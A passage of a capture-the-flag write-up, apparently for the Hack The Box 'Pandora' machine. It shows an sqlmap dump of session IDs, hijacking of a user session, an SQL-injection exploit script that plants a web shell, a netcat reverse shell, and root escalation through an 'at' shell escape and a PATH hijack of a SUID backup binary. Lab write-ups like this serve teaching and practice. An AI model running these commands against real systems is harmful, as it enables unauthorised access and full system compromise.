| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 6u8oaph5h1qdm83ln4rh96kjdm | NULL                                                | 1650479912  |
| 7ugkpf9nvbgjtjipiaif07koc5 | NULL                                                | 1650478923  |
| 7va8m1hflfplu85e101mt3g8hf | NULL                                                | 1650479904  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| aocrdjm6j2lan5h4d7imtu04jh | NULL                                                | 1650480003  |
| b2n0rh0vr16hmf0dot82j9pihl | NULL                                                | 1650479939  |
| bbfk40smi3cr39nl7d8d4jpen2 | NULL                                                | 1650479971  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| e1tkfipm7lq390mi7lavm9qpci | NULL                                                | 1650480240  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| i0gmmnuq07kig8pfdsurf8llr3 | NULL                                                | 1650480185  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| opr5oocre9gd4ad0uum2plegmb | NULL                                                | 1650480663  |
| ou3tspifvo6tiinka66eprft8a | NULL                                                | 1650479933  |
| pb75smfb0hc3lvmm4glq5b3oer | id_usuario|s:6:"daniel";                            | 1650469850  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| plgpa9gst0261ggq2h6acmohl4 | NULL                                                | 1650477238  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| qujvpae50d4jigagujj0rpdggr | NULL                                                | 1650479292  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u5vp5lm3j9mtk1slljn9us89oi | id_usuario|s:6:"daniel";                            | 1650479017  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
+----------------------------+-----------------------------------------------------+-------------+

[11:52:08] [INFO] table 'pandora.tsessions_php' dumped to CSV file '/home/noob2uub/.local/share/sqlmap/output/localhost/dump/pandora/tsessions_php.csv'
[11:52:08] [INFO] fetched data logged to text files under '/home/noob2uub/.local/share/sqlmap/output/localhost'

[*] ending @ 11:52:08 /2022-04-20/
```
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |

We find Matts session now lets use it. 

http://localhost:8080/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq

![Screenshot_2022-04-20_12-00-17](https://user-images.githubusercontent.com/68706090/164303270-a6180efe-c436-4f1b-9cc4-a885c60f02a7.png)

I was confused on this page for a minute and refreshed my screeen a few times, but this actually authenicated me when I removed everything from the URL. 

![Screenshot_2022-04-20_12-01-30](https://user-images.githubusercontent.com/68706090/164303429-c611d9d6-ec08-4baf-b923-4ca2a610fd0a.png)

I attempted to change Matts password in the WEBUI then SSH into the machine, but that did not work. 

After fumbling around with this forever I found this python script 

https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py

```console
noob2uub@kali:~/Documents/Tools$ python3 sqlpwn.py -t 127.0.0.1:8080
URL:  http://127.0.0.1:8080/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : dq2oovltqpija9j14t0s8cqjhs
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://127.0.0.1:8080/pandora_console/images/pwn.php?test=
CMD > 
```

http://localhost:8080/pandora_console/include/chart_generator.php?session_id=dq2oovltqpija9j14t0s8cqjhs

This allowed me to get the admin session cookie. 

![admin](https://user-images.githubusercontent.com/68706090/164309285-e0c85bbc-8313-4416-a37b-52389305cb1d.png)

Looking more into the structure of the website, normally I would run gobuster to look for more directories, but I only have a session cookie and also al ready have access to the www directory. Here we see the directory layout.

```console
daniel@pandora:/var/www/pandora/pandora_console$ ls
ajax.php       docker_entrypoint.sh  index.php                         pandoradb_data.sql
attachment     Dockerfile            install.done                      pandoradb.sql
audit.log      extensions            mobile                            pandora_websocket_engine.service
AUTHORS        extras                operation                         tests
composer.json  fonts                 pandora_console.log               tools
composer.lock  general               pandora_console_logrotate_centos  vendor
COPYING        godmode               pandora_console_logrotate_suse    ws.php
DB_Dockerfile  images                pandora_console_logrotate_ubuntu
DEBIAN         include               pandora_console_upgrade
```

We see a folder called images which looks alot like the file manager page on the admin WEBUI

![Screenshot_2022-04-20_12-53-14](https://user-images.githubusercontent.com/68706090/164311795-7590eebe-fe6d-4733-b40e-106bae780664.png)

lets run NC and put a reverse shell there and see what happens 

### Reverse Shell

```console
noob2uub@kali:~/Documents/Tools$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.136] 39846
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:53:10 up  4:03,  3 users,  load average: 0.11, 0.15, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.14.49      15:55    1:28   0.24s  0.03s ssh -L 8080:127.0.0.1:80 daniel@pandora.htb
daniel   pts/1    127.0.0.1        17:32    5:39   0.05s  0.05s -bash
daniel   pts/2    10.10.14.49      18:38    4:38   0.03s  0.03s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
matt
$ 
```

I was hoping since I had admin access to the site it would pop a root shell, but we see I am Matt. 

python3 -c 'import pty; pty.spawn("/bin/bash")'

and we can navigate to his home dir for the first flag. Now lets go on the privledge escalation

#Privledge Escalation

I remember this in linpeas 

-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)

I couldn't get anywhere with this so after digging around and searched what he had access to

```console
matt@pandora:/$ find / -perm -u=s -type f 2>/dev/null  
find / -perm -u=s -type f 2>/dev/null  
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
matt@pandora:/$ 
```

Searching through GTFO Bins i found at and ran 

```console
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

which provided me with the ability to run sudo, but fair warning, stabolize your shell prior to running this or it is poo on itself. 

now lets see if we can play with the pandora_backup, looking at the file we can see that it is a TAR so lets see if we can poison the path and get it to run "/bin/bash"

```console
matt@pandora:/tmp$ echo "/bin/bash" > tar
echo "/bin/bash" > tar
matt@pandora:/tmp$ chmod 777 tar
chmod 777 tar
matt@pandora:/tmp$ echo $PATH 
echo $PATH 
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
matt@pandora:/tmp$ export PATH=/tmp:$PATH 
export PATH=/tmp:$PATH 
matt@pandora:/tmp$ /usr/bin/pandora_backup
/usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# 
```






